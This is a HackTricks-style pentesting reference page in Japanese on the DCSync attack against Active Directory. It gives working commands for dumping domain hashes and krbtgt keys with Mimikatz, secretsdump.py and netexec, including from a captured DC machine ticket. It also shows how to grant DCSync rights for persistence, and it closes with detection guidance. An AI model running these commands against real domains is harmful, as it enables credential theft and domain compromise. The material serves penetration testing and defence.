# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** 権限とは、ドメイン自体に対する以下の権限を持つことを意味します: **DS-Replication-Get-Changes**、**Replicating Directory Changes All**、および **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**DCSync に関する重要な注意事項:**

- **DCSync attack は Domain Controller の動作をシミュレートし、Directory Replication Service Remote Protocol (MS-DRSR) を使用して、他の Domain Controller に情報のレプリケーションを要求します**。MS-DRSR は Active Directory の有効かつ必要な機能であるため、停止または無効化できません。
- デフォルトでは、必要な権限を持つのは **Domain Admins、Enterprise Admins、Administrators、Domain Controllers** グループのみです。
- 実際には、**完全な DCSync** にはドメイン命名コンテキストに対する **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** が必要です。`DS-Replication-Get-Changes-In-Filtered-Set` はこれらと一緒に委任されることが一般的ですが、単独では krbtgt の完全なダンプよりも、**機密属性 / RODC によってフィルターされた属性**（たとえば、旧式の LAPS 形式のシークレット）の同期に関係します。<sup>[[2]](#references)</sup>
- アカウントのパスワードが可逆暗号化で保存されている場合、Mimikatz にはパスワードを平文で返すオプションがあります。

### 列挙

`powerview` を使用して、これらの権限を持つユーザーを確認します:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

DCSync 権限を持つ**デフォルト以外のプリンシパル**に注目する場合は、レプリケーション機能を持つ組み込みグループを除外し、想定外の trustee のみを確認します。

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### ローカルでExploit

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### リモートから悪用する

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

実践的なスコープ指定の例:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### キャプチャした DC マシン TGT（ccache）を使用した DCSync

ドメインコントローラー上のサービスを確認する際は、サービスのローカル ID とネットワーク ID を区別してください。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions)によると、SQL Server の仮想アカウント（`NT SERVICE\...`）は、ホストコンピューターアカウントとしてネットワークリソースにアクセスします。ドメインコントローラーでは、このため DC マシンアカウントがレプリケーション権限の確認に関係する場合がありますが、サービスへの foothold だけでは、エクスポート可能なマシン TGT や、DCSync に使用できる認証情報があるとは限りません。これを攻撃経路として扱う前に、実際のサービス ID、送信時の認証コンテキスト、利用可能なチケットまたは認証情報、および実効レプリケーション権限を確認してください。

非制約委任の export-mode シナリオでは、Domain Controller のマシン TGT（例：`krbtgt@DOMAIN` に対する `DC1$@DOMAIN`）をキャプチャできることがあります。その後、この ccache を使って DC として認証し、パスワードなしで DCSync を実行できます。<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Operational notes:

- **ImpacketのKerberos pathは、DRSUAPI callの前にまずSMBにアクセスします**。環境で**SPN target name validation**が強制されている場合、full dumpは失敗することがあります。`Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`
- その場合は、まず対象DCの**`cifs/<dc>`**サービスチケットを要求するか、すぐに必要なアカウントに対して**`-just-dc-user`**を使用してください。
- レプリケーション権限が低い場合でも、LDAP/DirSync形式の同期によって、完全なkrbtgtレプリケーションを行わずに、**confidential**属性や**RODC-filtered**属性（たとえば、古い`ms-Mcs-AdmPwd`）が漏えいすることがあります。<sup>[[2]](#references)</sup>

`-just-dc`は3つのファイルを生成します。

- **NTLMハッシュ**を含むファイル
- **Kerberosキー**を含むファイル
- [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)が有効に設定されているアカウントについて、NTDSから取得した平文パスワードを含むファイル。reversible encryptionが有効なユーザーは、次の方法で取得できます。

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### 永続化

ドメイン管理者であれば、PowerView を使って任意のユーザーにこれらの権限を付与できます。<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linuxのオペレーターも `bloodyAD` を使って同じことができます:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

次に、以下の出力を確認して、ユーザーに3つの権限が正しく割り当てられているか確認できます（「ObjectType」フィールド内に権限名が表示されるはずです）：

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### 緩和策

- Security Event ID 4662（オブジェクトの監査ポリシーを有効にする必要があります）– オブジェクトに対する操作が実行された<sup>[[4]](#references)</sup>
- Security Event ID 5136（オブジェクトの監査ポリシーを有効にする必要があります）– ディレクトリサービスオブジェクトが変更された
- Security Event ID 4670（オブジェクトの監査ポリシーを有効にする必要があります）– オブジェクトのアクセス許可が変更された
- AD ACL Scanner - ACL のレポートを作成し、比較します。[https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket 変更履歴](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Get-Changes と Get-Changes-In-Filtered-Set のレプリケーションを活用する](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: ドメインコントローラーからパスワードハッシュをダンプする](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL の認証情報 → Targeted Kerberoast → Unconstrained Delegation → DCSync で DA を取得](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
